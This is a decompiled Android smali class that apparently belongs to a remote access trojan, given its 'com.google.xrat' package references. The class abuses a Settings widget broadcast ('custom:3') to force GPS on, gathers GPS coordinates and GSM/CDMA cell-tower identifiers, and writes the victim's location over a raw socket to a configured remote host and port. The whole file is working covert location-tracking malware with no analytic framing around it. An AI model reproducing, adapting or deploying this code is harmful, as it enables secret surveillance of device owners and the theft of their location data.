.class public final Lcom/v1/lib/f;
.super Ljava/lang/Object;


# instance fields
.field private a:Landroid/location/LocationManager;

.field private b:Landroid/content/Context;

.field private c:D

.field private d:D

.field private e:Ljava/lang/String;

.field private f:Landroid/location/Location;

.field private g:Ljava/lang/String;

.field private h:I

.field private final i:Landroid/location/LocationListener;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 4

    const-wide/16 v1, 0x0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/v1/lib/f;->a:Landroid/location/LocationManager;

    iput-wide v1, p0, Lcom/v1/lib/f;->c:D

    iput-wide v1, p0, Lcom/v1/lib/f;->d:D

    new-instance v0, Lcom/v1/lib/g;

    invoke-direct {v0, p0}, Lcom/v1/lib/g;-><init>(Lcom/v1/lib/f;)V

    iput-object v0, p0, Lcom/v1/lib/f;->i:Landroid/location/LocationListener;

    iput-object p1, p0, Lcom/v1/lib/f;->b:Landroid/content/Context;

    const-string v0, "location"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/location/LocationManager;

    iput-object v0, p0, Lcom/v1/lib/f;->a:Landroid/location/LocationManager;

    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    const-string v1, "com.android.settings"

    const-string v2, "com.android.settings.widget.SettingsAppWidgetProvider"

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "android.intent.category.ALTERNATIVE"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "custom:3"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    :try_start_0
    iget-object v1, p0, Lcom/v1/lib/f;->b:Landroid/content/Context;

    const/4 v2, 0x0

    const/4 v3, 0x0

    invoke-static {v1, v2, v0, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/PendingIntent;->send()V
    :try_end_0
    .catch Landroid/app/PendingIntent$CanceledException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    :goto_0
    iget-object v0, p0, Lcom/v1/lib/f;->a:Landroid/location/LocationManager;

    const-string v1, "gps"

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/v1/lib/f;->a:Landroid/location/LocationManager;

    const-string v1, "gps"

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    :cond_0
    invoke-direct {p0}, Lcom/v1/lib/f;->a()Ljava/lang/String;

    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Landroid/app/PendingIntent$CanceledException;->printStackTrace()V

    goto :goto_0

    :catch_1
    move-exception v0

    goto :goto_0
.end method

.method private a()Ljava/lang/String;
    .locals 8

    const/4 v2, 0x0

    iget-object v0, p0, Lcom/v1/lib/f;->b:Landroid/content/Context;

    const-string v1, "phone"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    :try_start_0
    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getCellLocation()Landroid/telephony/CellLocation;

    move-result-object v1

    check-cast v1, Landroid/telephony/gsm/GsmCellLocation;

    if-eqz v1, :cond_1

    invoke-virtual {v1}, Landroid/telephony/gsm/GsmCellLocation;->getCid()I
    :try_end_0
    .catch Ljava/lang/ClassCastException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    move-result v3

    :try_start_1
    invoke-virtual {v1}, Landroid/telephony/gsm/GsmCellLocation;->getLac()I
    :try_end_1
    .catch Ljava/lang/ClassCastException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    move-result v1

    :goto_0
    :try_start_2
    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x3

    const/4 v6, 0x5

    invoke-virtual {v4, v5, v6}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Integer;->intValue()I
    :try_end_2
    .catch Ljava/lang/ClassCastException; {:try_start_2 .. :try_end_2} :catch_0
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_3

    move-result v2

    move v0, v1

    move v1, v3

    :goto_1
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, ","

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, ","

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    :goto_2
    return-object v0

    :catch_0
    move-exception v1

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getCellLocation()Landroid/telephony/CellLocation;

    move-result-object v0

    check-cast v0, Landroid/telephony/cdma/CdmaCellLocation;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/telephony/cdma/CdmaCellLocation;->getSystemId()I

    move-result v1

    invoke-virtual {v0}, Landroid/telephony/cdma/CdmaCellLocation;->getNetworkId()I

    move-result v2

    invoke-virtual {v0}, Landroid/telephony/cdma/CdmaCellLocation;->getBaseStationId()I

    move-result v0

    :goto_3
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "cdma"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v3, ","

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, ","

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_2

    :catch_1
    move-exception v0

    move-object v3, v0

    move v1, v2

    move v0, v2

    :goto_4
    invoke-virtual {v3}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1

    :catch_2
    move-exception v0

    move v1, v3

    move-object v3, v0

    move v0, v2

    goto :goto_4

    :catch_3
    move-exception v0

    move-object v7, v0

    move v0, v1

    move v1, v3

    move-object v3, v7

    goto :goto_4

    :cond_0
    move v0, v2

    move v1, v2

    goto :goto_3

    :cond_1
    move v1, v2

    move v3, v2

    goto/16 :goto_0
.end method

.method static synthetic a(Lcom/v1/lib/f;)V
    .locals 10

    const-wide/16 v8, 0x0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v6

    :cond_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    const-wide/32 v2, 0xea60

    add-long/2addr v2, v6

    cmp-long v0, v0, v2

    if-ltz v0, :cond_2

    :cond_1
    iput-wide v8, p0, Lcom/v1/lib/f;->c:D

    iput-wide v8, p0, Lcom/v1/lib/f;->d:D

    iget-object v0, p0, Lcom/v1/lib/f;->a:Landroid/location/LocationManager;

    iget-object v1, p0, Lcom/v1/lib/f;->i:Landroid/location/LocationListener;

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->removeUpdates(Landroid/location/LocationListener;)V

    :goto_0
    return-void

    :cond_2
    iget-object v0, p0, Lcom/v1/lib/f;->a:Landroid/location/LocationManager;

    iget-object v1, p0, Lcom/v1/lib/f;->e:Ljava/lang/String;

    const-wide/16 v2, 0xbb8

    const/4 v4, 0x0

    iget-object v5, p0, Lcom/v1/lib/f;->i:Landroid/location/LocationListener;

    invoke-virtual/range {v0 .. v5}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V

    iget-object v0, p0, Lcom/v1/lib/f;->f:Landroid/location/Location;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/v1/lib/f;->f:Landroid/location/Location;

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/v1/lib/f;->f:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getTime()J

    move-result-wide v0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    sub-long v0, v2, v0

    const-wide/32 v2, 0x927c0

    cmp-long v0, v0, v2

    if-gtz v0, :cond_0

    iget-object v0, p0, Lcom/v1/lib/f;->f:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getLatitude()D

    move-result-wide v0

    iput-wide v0, p0, Lcom/v1/lib/f;->c:D

    iget-object v0, p0, Lcom/v1/lib/f;->f:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getLongitude()D

    move-result-wide v0

    iput-wide v0, p0, Lcom/v1/lib/f;->d:D

    new-instance v0, Ljava/lang/StringBuilder;

    iget-wide v1, p0, Lcom/v1/lib/f;->d:D

    invoke-static {v1, v2}, Ljava/lang/String;->valueOf(D)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v1, ","

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-wide v1, p0, Lcom/v1/lib/f;->c:D

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    :try_start_0
    new-instance v1, Ljava/net/Socket;

    iget-object v2, p0, Lcom/v1/lib/f;->g:Ljava/lang/String;

    iget v3, p0, Lcom/v1/lib/f;->h:I

    invoke-direct {v1, v2, v3}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    new-instance v2, Ljava/io/DataOutputStream;

    invoke-virtual {v1}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v1

    invoke-direct {v2, v1}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    const/16 v1, 0xce

    const/4 v3, 0x0

    invoke-static {v0}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v4

    array-length v4, v4

    invoke-static {v0}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v0

    invoke-static {v1, v3, v4, v0}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/io/DataOutputStream;->write([B)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    :goto_1
    iget-object v0, p0, Lcom/v1/lib/f;->a:Landroid/location/LocationManager;

    iget-object v1, p0, Lcom/v1/lib/f;->i:Landroid/location/LocationListener;

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->removeUpdates(Landroid/location/LocationListener;)V

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1
.end method
